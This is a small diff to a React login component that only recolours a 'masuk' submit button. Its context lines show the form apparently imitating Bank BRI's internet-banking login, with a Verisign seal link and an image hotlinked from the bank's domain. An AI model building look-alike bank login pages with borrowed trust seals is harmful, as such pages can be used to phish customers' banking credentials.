@@ -52,7 +52,7 @@ import React, { useState } from 'react'
             <br/>
             <br/>
             <p  className='text-secondary' id='error'></p>
-            <button type="submit" id='masuk'>masuk</button>
+            <button type="submit" id='masuk' style={{color:'#013161'}}>masuk</button>
             <div style={{float: 'left', width : '100%'}}>
               <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=ib.bri.co.id" className="verisign">
                 <img className="verisign-logo" src="https://ib.bri.co.id/ib-bri/img/securesite1rtc.jpg" width="100px" height="55px" />
